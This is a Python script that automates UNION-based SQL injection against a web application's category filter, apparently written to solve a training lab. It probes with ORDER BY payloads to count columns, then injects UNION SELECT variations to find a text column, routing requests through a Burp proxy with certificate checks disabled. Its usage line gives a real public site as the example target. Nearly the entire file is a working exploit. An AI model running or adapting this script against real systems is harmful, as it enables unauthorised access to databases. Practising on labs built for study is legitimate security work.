import sys

import requests
import urllib3

urllib3.disable_warnings()

# let the script go through the burp suite proxy
# for debuging purposes
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# def union_attack(base_url, attack_payload):
#     pass


def order_attack(base_url):
    num_of_col = 0
    for i in range(1, 50):
        uri = f"filter?category='ORDER BY {i}--"
        r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
        if r.status_code != 200:
            num_of_col = i - 1
            break
    return num_of_col


def exploit_sqli_column_text(base_url, num_of_col, payload_entered):
    uri = "filter?category=Gifts'"
    for i in range(num_of_col):
        variation = ["NULL"] * num_of_col
        variation[i] = payload_entered
        str_variation = ", ".join(variation)
        # py = urllib.parse.quote(f" UNION select {str_variation}--")
        py = f" UNION select {str_variation}--"
        print(base_url + uri + py)
        r = requests.get(base_url + uri + py, proxies=proxies, verify=False, timeout=5)
        payload_matches = r.text.find(payload_entered[1:-1])
        if payload_matches != -1:
            print(f"[+] Exploit successful, column {i} is of type text")
            return True

    return False


def exploit_sqli(base_url, payload_entered):
    num_of_col = order_attack(base_url)
    if num_of_col > 0:
        print(f"[+] Number of columns: {num_of_col}")
        found = exploit_sqli_column_text(base_url, num_of_col, payload_entered)
        if found:
            return num_of_col

    return 0


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.google.com" "1=1"')
        sys.exit(-1)

    number_of_columns = exploit_sqli(url, payload)
    if number_of_columns <= 0:
        print("[-] Exploit failed")
